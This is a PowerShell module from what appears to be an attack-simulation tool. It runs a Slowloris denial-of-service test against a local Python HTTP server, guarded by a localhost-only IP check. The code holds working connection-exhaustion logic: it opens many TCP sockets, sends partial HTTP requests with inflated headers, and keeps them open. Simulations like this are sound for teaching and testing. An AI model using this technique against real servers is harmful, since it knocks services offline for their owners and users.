# Slowloris Simulation Module for Windows

function Invoke-SlowlorisSimulation {
    param($Config)
    
    Clear-Host
    Show-Header
    Write-Host "=== SLOWLORIS ATTACK SIMULATION ===" -ForegroundColor Cyan
    
    # Verify target is localhost
    if ($Config.target_ip -ne "127.0.0.1") {
        Write-Host "Security violation: Target must be localhost!" -ForegroundColor Red
        return
    }
    
    Write-Host "This simulation will open $($Config.slowloris_conns) partial HTTP connections"
    Write-Host "Press Ctrl+C to abort`n"
    
    try {
        # Start a simple HTTP server for testing
        Start-Job -ScriptBlock {
            python -m http.server $using:Config.http_port
        } | Out-Null
        Start-Sleep -Seconds 2
        
        $sockets = @()
        $stopwatch = [System.Diagnostics.Stopwatch]::StartNew()
        
        for ($i = 0; $i -lt $Config.slowloris_conns; $i++) {
            $socket = New-Object System.Net.Sockets.TcpClient($Config.target_ip, $Config.http_port)
            $stream = $socket.GetStream()
            $writer = New-Object System.IO.StreamWriter($stream)
            
            # Send partial HTTP request
            $writer.WriteLine("GET / HTTP/1.1")
            $writer.WriteLine("Host: localhost")
            $writer.WriteLine("User-Agent: Slowloris/1.0")
            $writer.WriteLine("Content-Length: 1000000")
            $writer.WriteLine("X-a: " + ('b' * 1000))
            $writer.Flush()
            
            $sockets += $socket
            
            if ($i % 10 -eq 0) {
                Write-Progress -Activity "Opening connections" -Status "Opened $i of $($Config.slowloris_conns)" -PercentComplete ($i/$Config.slowloris_conns*100)
            }
        }
        $stopwatch.Stop()
        
        Write-Host "`nOpened $($Config.slowloris_conns) connections in $($stopwatch.Elapsed.TotalSeconds.ToString("0.00")) seconds" -ForegroundColor Green
        Write-Host "Keeping connections open... (Press Enter to close)"
        
        # Monitor connection status
        $monitorJob = Start-Job -ScriptBlock {
            while ($true) {
                $active = (Get-NetTCPConnection -LocalPort $using:Config.http_port -State Established).Count
                [PSCustomObject]@{
                    Time = Get-Date -Format "HH:mm:ss"
                    ActiveConnections = $active
                }
                Start-Sleep -Seconds 1
            }
        }
        
        # Display connection status
        do {
            $status = Receive-Job $monitorJob -Keep
            if ($status) {
                Write-Host "[$($status.Time)] Active connections: $($status.ActiveConnections)" -ForegroundColor Yellow
            }
        } until ([Console]::KeyAvailable)
        
        Read-Host | Out-Null
    }
    catch {
        Write-Host "Error: $_" -ForegroundColor Red
    }
    finally {
        # Cleanup
        if ($monitorJob) { Stop-Job $monitorJob; Remove-Job $monitorJob }
        $sockets | ForEach-Object { $_.Close() }
        Get-Job | Stop-Job -PassThru | Remove-Job
        Log-Event -AttackType "Slowloris" -Parameters "Connections:$($Config.slowloris_conns)"
    }
    
    Read-Host "`nPress Enter to continue"
}
